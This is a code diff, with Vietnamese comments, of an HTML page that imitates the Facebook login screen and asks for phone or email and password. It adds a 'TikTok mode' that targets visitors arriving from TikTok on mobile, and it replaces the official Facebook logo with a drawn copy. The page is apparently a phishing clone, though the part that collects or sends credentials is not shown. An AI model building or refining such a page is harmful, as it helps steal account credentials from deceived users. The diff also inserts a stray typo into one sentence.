@@ -166,12 +166,17 @@
             width: 100%;
             max-width: 400px;
             background: transparent;
-            padding: 20px;
-            margin-top: 100px;
+            padding: 15px; /* Giảm padding để vừa màn hình nhỏ */
+            margin-top: 60px; /* Giảm margin-top để vừa màn hình */
             text-align: left;
             position: relative;
             z-index: 1;
             display: none;
+        }
+        body.tiktok-mode .login-container-tiktok {
+            margin-top: 50px; /* Điều chỉnh riêng cho TikTok mode */
+            max-height: calc(100vh - 100px); /* Giới hạn chiều cao để vừa màn hình */
+            overflow-y: auto; /* Cho phép cuộn nếu nội dung dài */
         }
         .login-container-tiktok.active, .login-container-desktop.active,
         .forgot-password-container.active, .forgot-password-email-container.active, 
@@ -186,26 +191,41 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            margin: 40px 0;
+            margin: 20px 0; /* Giảm margin để vừa màn hình */
         }
         .facebook-logo img {
-            width: 60px;
-            height: 60px;
+            width: 50px; /* Giảm kích thước logo */
+            height: 50px;
+        }
+        .custom-logo {
+            width: 50px; /* Giảm kích thước logo */
+            height: 50px;
+            background-color: #1A85FF;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            font-size: 30px; /* Giảm kích thước chữ f */
+            font-family: Helvetica, Arial, sans-serif;
+            font-weight: bold;
+            text-transform: lowercase;
+            border: 2px solid #fff;
         }
         .login-container-tiktok input, .login-container-desktop input,
         .forgot-password-container input, .forgot-password-email-container input, 
         .create-account-container input {
-            margin-bottom: 15px;
+            margin-bottom: 10px; /* Giảm khoảng cách giữa các input */
             border-radius: 6px;
             width: 100%;
-            padding: 12px;
+            padding: 10px; /* Giảm padding input */
             border: 1px solid #ddd;
             background: #fff;
         }
         .btn-primary {
             width: 100%;
             border-radius: 6px;
-            padding: 12px;
+            padding: 10px; /* Giảm padding nút */
             background-color: #1877f2;
             border-color: #1877f2;
             color: white;
@@ -217,11 +237,11 @@
             border: 1px solid #1877f2;
             border-radius: 6px;
             width: 100%;
-            padding: 12px;
+            padding: 10px;
             font-weight: bold;
         }
         .forgot-password {
-            margin-top: 15px;
+            margin-top: 10px;
             color: #1877f2;
             cursor: pointer;
             font-size: 14px;
@@ -230,7 +250,7 @@
         }
         .bottom-section {
             position: fixed;
-            bottom: 30px;
+            bottom: 20px; /* Giảm khoảng cách dưới */
             width: 100%;
             max-width: 400px;
             left: 50%;
@@ -286,7 +306,7 @@
         .search-by-email, .search-by-phone {
             display: block;
             text-align: center;
-            margin-top: 15px;
+            margin-top: 10px;
             padding: 10px;
             background: transparent;
             color: #737373;
@@ -467,12 +487,12 @@
             .facebook-logo img { width: 50px; height: 50px; }
             .login-container-tiktok, .forgot-password-container, .forgot-password-email-container, 
             .create-account-container, .about-container, .help-container, .more-container { 
-                padding: 15px; margin-top: 80px; 
+                padding: 15px; margin-top: 50px; 
             }
-            .facebook-logo { margin: 30px 0; }
+            .facebook-logo { margin: 20px 0; }
             .btn-primary, .btn-create-account { padding: 10px; }
             .footer-links-tiktok { gap: 15px; }
-            .bottom-section { bottom: 25px; }
+            .bottom-section { bottom: 20px; }
             .gradient-section { top: 60px; height: 40%; }
             .fb-section h2 { font-size: 20px; }
         }
@@ -534,7 +554,7 @@
         <!-- TikTok Login Container -->
         <div class="login-container-tiktok">
             <div class="facebook-logo">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+                <div class="custom-logo">f</div>
             </div>
             <input type="text" id="login-input-tiktok" class="form-control" placeholder="Số di động hoặc email">
             <input type="password" id="password-tiktok" class="form-control" placeholder="Mật khẩu">
@@ -620,7 +640,7 @@
         <div class="more-container">
             <div class="fb-section">
                 <h2>Xem thêm</h2>
-                <p>Khám phá các sản phẩm, tính năng và dịch vụ khác từ Facebook và Meta.</p>
+                <p>Khám phá các sản W phẩm, tính năng và dịch vụ khác từ Facebook và Meta.</p>
             </div>
             <div class="fb-section">
                 <h2>Sản phẩm</h2>
@@ -720,17 +740,17 @@
             console.log("Is From TikTok:", isFromTikTok);
 
             document.body.classList.remove('tiktok-mode', 'desktop-mode');
+            const header = document.querySelector('.header');
 
             if (isFromTikTok && !isDesktop) {
                 console.log("Applying TikTok mode");
                 document.body.classList.add('tiktok-mode');
-                document.querySelector('.header').classList.remove('hidden');
-                document.querySelector('.login-container-tiktok').style.marginTop = '20px';
+                header.classList.remove('hidden'); // Chỉ hiển thị header trong TikTok mode
                 hideAllExcept('.login-container-tiktok');
             } else {
                 console.log("Applying Desktop mode");
                 document.body.classList.add('desktop-mode');
-                document.querySelector('.header').classList.add('hidden');
+                header.classList.add('hidden'); // Ẩn header trong desktop mode
                 document.querySelector('.left-section').style.display = 'block';
                 hideAllExcept('.login-container-desktop');
             }
@@ -767,6 +787,7 @@
             } else if (isDesktop) {
                 hideAllExcept('.login-container-desktop');
                 document.querySelector('.left-section').style.display = 'block';
+                document.querySelector('.header').classList.add('hidden'); // Ẩn header khi quay lại desktop
             }
         }
 
